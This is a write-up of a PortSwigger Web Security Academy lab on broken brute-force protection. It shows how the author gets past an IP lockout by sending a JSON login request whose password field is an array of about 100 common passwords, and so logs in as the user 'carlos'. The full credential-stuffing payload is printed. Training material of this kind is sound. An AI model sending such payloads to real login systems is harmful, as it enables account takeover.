---
title: "auth 13 - portswigger labs"
category: "web"
subcategory: "web"
type: "writeup"
tags: ["web", "burp", "auth", "web-exploitation", "auth-13", "portswigger-labs"]
summary: "web writeup for \"auth 13\" from portswigger labs - techniques: burp, auth, web-exploitation, auth-13, portswigger-labs."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-13/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Authentication/auth-13/README.md"
ctf:
  name: "portswigger labs"
  challenge: "auth 13"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** auth 13
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-13/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Authentication/auth-13/README.md>

---
# Broken brute-force protection, multiple credentials per request | Dec 22, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request), you'll learn: Broken brute-force protection, multiple credentials per request! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Exploitation

**Login page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-13/images/Pasted%20image%2020221222065102.png)

**Let's try to trigger the brute force protection:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-13/images/Pasted%20image%2020221222065155.png)

If we entered incorrect password **4 times**, the application will block our IP address.

**Burp Suite HTTP history:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-13/images/Pasted%20image%2020221222065806.png)

In here, we can see that the login credentails is in **JSON format**.

However, in JSON, we can send an array to a key via `[]`!

**For example:**
```json
{
    "username":"carlos",
    "password":[
        "123456"
        "password"
        "12345678"
        "..."
    ],
    "":""
}
```

**Armed with above information, we can see an array of passwords!**
```json
{
    "username":"carlos",
    "password":[
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "12345",
        "1234",
        "111111",
        "1234567",
        "dragon",
        "123123",
        "baseball",
        "abc123",
        "football",
        "monkey",
        "letmein",
        "shadow",
        "master",
        "666666",
        "qwertyuiop",
        "123321",
        "mustang",
        "1234567890",
        "michael",
        "654321",
        "superman",
        "1qaz2wsx",
        "7777777",
        "121212",
        "000000",
        "qazwsx",
        "123qwe",
        "killer",
        "trustno1",
        "jordan",
        "jennifer",
        "zxcvbnm",
        "asdfgh",
        "hunter",
        "buster",
        "soccer",
        "harley",
        "batman",
        "andrew",
        "tigger",
        "sunshine",
        "iloveyou",
        "2000",
        "charlie",
        "robert",
        "thomas",
        "hockey",
        "ranger",
        "daniel",
        "starwars",
        "klaster",
        "112233",
        "george",
        "computer",
        "michelle",
        "jessica",
        "pepper",
        "1111",
        "zxcvbn",
        "555555",
        "11111111",
        "131313",
        "freedom",
        "777777",
        "pass",
        "maggie",
        "159753",
        "aaaaaa",
        "ginger",
        "princess",
        "joshua",
        "cheese",
        "amanda",
        "summer",
        "love",
        "ashley",
        "nicole",
        "chelsea",
        "biteme",
        "matthew",
        "access",
        "yankees",
        "987654321",
        "dallas",
        "austin",
        "thunder",
        "taylor",
        "matrix",
        "mobilemail",
        "mom",
        "monitor",
        "monitoring",
        "montana",
        "moon",
        "moscow"
    ],
    "":""
}
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-13/images/Pasted%20image%2020221222070502.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-13/images/Pasted%20image%2020221222070510.png)

We're user `carlos`!

# What we've learned:

1. Broken brute-force protection, multiple credentials per request
